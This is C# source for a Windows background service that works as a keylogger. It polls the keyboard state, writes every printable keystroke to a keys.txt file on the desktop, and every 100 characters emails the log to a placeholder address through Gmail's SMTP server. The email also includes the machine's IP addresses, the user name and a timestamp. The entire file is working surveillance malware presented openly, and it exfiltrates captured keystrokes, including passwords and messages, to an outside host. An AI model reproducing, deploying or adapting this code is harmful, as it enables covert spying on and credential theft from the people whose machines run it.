using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace WindowsKeyLoggerService
{
    public class Worker : BackgroundService
    {
        private readonly ILogger<Worker> _logger;

        public Worker(ILogger<Worker> logger)
        {
            _logger = logger;
        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static int KeyCounter = 0;

        public static string FileDirectory { get; private set; }

        protected override async Task ExecuteAsync(CancellationToken StoppingToken)
        {
            var FileDirectory= Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // File directory
            
            if (!Directory.Exists(FileDirectory))  // Creating directory if it isnt exist
            {
                Directory.CreateDirectory(FileDirectory);
            }

            var KeyFile = (FileDirectory + @"/keys.txt"); // File name

            while (!StoppingToken.IsCancellationRequested)
            {
                if (!File.Exists(KeyFile)) // Creating file if it isnt exist 
                {
                    using (StreamWriter sw = File.CreateText(KeyFile));
                }
                for (int i = 32; i < 127; i++)
                {
                    int KeyState = GetAsyncKeyState(i);

                    if (KeyState != 0)
                    {
                        _logger.LogInformation((char)i + "");
                        KeyCounter++; 
                        using (StreamWriter sw = File.AppendText(KeyFile)) // Writing key to txt
                        {
                            sw.Write((char)i);
                        }
                        if (KeyCounter % 100 == 0) // When you need to send log (in this case every 100 char's) 
                        {
                            SendEmailMessage();
                        }

                    }
                    
                }
                await Task.Delay(100, StoppingToken); 
            }
        }
        static void SendEmailMessage() // Method for sending logs 
        {
            string FileDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string FilePath = FileDirectory + @"/Keys.txt";
            string LogContents = File.ReadAllText(FilePath);
            string EmailBody = "";

            DateTime now = DateTime.Now;
            string Subject = "Keylogger message";
            var Host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var adress in Host.AddressList)
            {
                EmailBody += "Address: " + adress;
            }

            EmailBody += "\n User: " + Environment.UserDomainName + "\\" + Environment.UserName;
            EmailBody += "\n host ";
            EmailBody += "\n Time " + now.ToString();
            EmailBody += LogContents;

            SmtpClient Client = new SmtpClient("smtp.gmail.com", 587); // Smpt and port 
            MailMessage MailMessage = new MailMessage();

            MailMessage.From = new MailAddress("Email");  // Valid email to send logs 
            MailMessage.To.Add("Email"); // Email for receiving 
            MailMessage.Subject = Subject;
            Client.UseDefaultCredentials = false;
            Client.EnableSsl = true;
            Client.Credentials = new NetworkCredential("Email", "Password"); // Valid email to send logs 
            MailMessage.Body = EmailBody;

            Client.Send(MailMessage);
        }
    }
}
